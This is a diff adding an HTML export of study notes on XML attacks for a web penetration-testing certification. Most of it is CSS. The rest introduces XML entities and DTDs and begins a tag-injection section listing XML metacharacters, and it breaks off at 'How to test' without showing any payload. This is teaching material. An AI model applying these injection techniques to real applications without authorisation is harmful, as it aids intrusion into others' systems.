@@ -1,0 +1,1027 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>XML Attacks</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="df5655cd-af8d-483e-9f10-671edf42ea90" class="page mono"><header><h1 class="page-title"><strong>XML Attacks</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="85993dd3-cd21-49a4-baeb-b6cbb934731a" class=""><strong>XML Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#xml-attacks"></a></strong></h1><ul id="bf49d743-5fdd-48f6-8341-3d67395a84a3" class="bulleted-list"><li style="list-style-type:disc">XML Tag Injection</li></ul><ul id="4e4463ea-17e7-4c9d-a9ea-7e8623f4ccc9" class="bulleted-list"><li style="list-style-type:disc">XML eXternal Entity</li></ul><ul id="8c2637b9-243f-457d-80f0-e29c8d62488c" class="bulleted-list"><li style="list-style-type:disc">XML Entity Expansion</li></ul><ul id="89bf10b0-fc6e-4a59-abc0-ee67aba5d161" class="bulleted-list"><li style="list-style-type:disc">Xpath Injection</li></ul><h2 id="f2e7fa7f-c452-477b-b130-1d6a3cc1aec0" class=""><strong>Introduction</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#introduction"></a></strong></h2><p id="83b11026-c74d-45f6-8a17-33ba03499cfe" class="">There are many fields of use that leverage XML:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b8ff1760-d971-4ea5-aff4-73d53bd04c1b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- PDF
+- RSS
+- OOXML
+- SVG
+- network protocols such XMLRPC, SOAP, WebDAV and many others
+</code></pre><h3 id="bf2f3579-076d-436e-b5e6-a862c4612417" class=""><strong>Recap</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#recap"></a></strong></h3><p id="a4067ebd-6f9c-4b08-aff9-8d1c111a8595" class="">Technically, XML is derived from the SGML standard and is the same standard on which HTML is based, however, with a lightweight implementation. This means that some SGML-based features, such as unclosed end-closed tags, etc. Are not implemented</p><ul id="b47faaa0-f946-43c8-ab9e-923e37bf0b4e" class="bulleted-list"><li style="list-style-type:disc">html5 standards is not SGML-based</li></ul><ul id="abca55d8-c0d8-4546-b273-bc3838646f96" class="bulleted-list"><li style="list-style-type:disc">Document Type Definition (DTD):</li></ul><p id="12ecb85e-82e4-4306-88fa-9879570fed79" class="">Block of XML:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ccc87202-fb3c-4bb8-9af6-0b70562e8ae1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Elements
+- Tags
+- Attributes
+- Entities
+- PCDATA (Parsed Character Data)
+- CDATA
+</code></pre><p id="19fb664a-b4b0-496b-8c4b-0fa011afc664" class="">Entities Block:</p><p id="4c13d95c-4292-4e81-aebc-4d4a22e5c1a0" class="">→ http://www.w3.org/TR/REC-xml/#sec-logical-struct</p><ul id="6437d634-2fd3-4197-beba-bb35df963887" class="bulleted-list"><li style="list-style-type:disc">To allow For flexibility, the specifications have introduced physical structures</li></ul><p id="026ff8f8-d5e2-4a3f-9ff3-1bf0566e7c77" class="">→ http://www.w3.org/TR/REC-xml/#sec-physical-struct</p><figure id="8eacd1bd-2931-4b87-bace-775b34295db2" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/4.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/4.png"/></a></figure><p id="3acf5a11-28fb-42fc-a96e-f2a9a011e6d7" class="">There are various types of entities, depending upon where they are declared, how reusable they are, and if they need to be parsed. They can be categorized, as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3b8f948e-006a-4a6c-8029-965c7ba7dd7c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Internal/External
+- General/Parameter
+- Parsed/Unparsed
+</code></pre><p id="7b11418b-6bdd-4bbe-adf3-8764ef6eda99" class="">Only 5 entity category combinations are considered legal</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d15a5a0f-e8c1-498a-94ba-5022209c77b6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Internal
+General   + Parsed
+Parameter + Parsed
+
+# External
+General   + Parsed
+General   + Unparsed
+Parameter + Parsed
+</code></pre><h3 id="df3a62a5-2d3e-4ee5-ba2b-64e7fd1fe969" class=""><strong>Generally speaking, there are three options</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#generally-speaking-there-are-three-options"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="79e48e52-ecf7-4ad2-9207-ee560febae70" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- XML is tampered
+- XML document containing an attack is sent
+- XML is taken using a querying mechanism
+</code></pre><h2 id="fd677e69-5de4-4589-8891-300fdc8820e4" class=""><strong>Tag/Fragment Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#tagfragment-injection"></a></strong></h2><p id="856bfd26-b122-4155-b17f-469e80dfcc7e" class="">In this scenario, thea attacker is able to alter the XML document structure by injecting both XML data and XML tags.</p><ul id="17068c16-2b1b-425f-999f-71fd464072a8" class="bulleted-list"><li style="list-style-type:disc">Lets assume a web app is using XML to store users and passwords</li></ul><p id="1838723c-03ad-403c-97a9-67b60693ffc0" class="">If the user is able to inject some <strong>XML metacharacters</strong> within the document. The, if they app fails to contextually validate data, its vulnerable to XML Injection:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="faf2fcfc-11e8-4977-bdf7-ef4e945753cf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Metacharacters: &#x27; &quot; &lt; &gt; &amp;    &#x27;
+</code></pre><p id="ef5b6908-0122-4994-8894-5e92854fc93b" class="">How to test:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de4b4d89-a5cd-4731-a314-ac0c6889e045" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- We have to inject metacharacters, attempting to break some of the structures
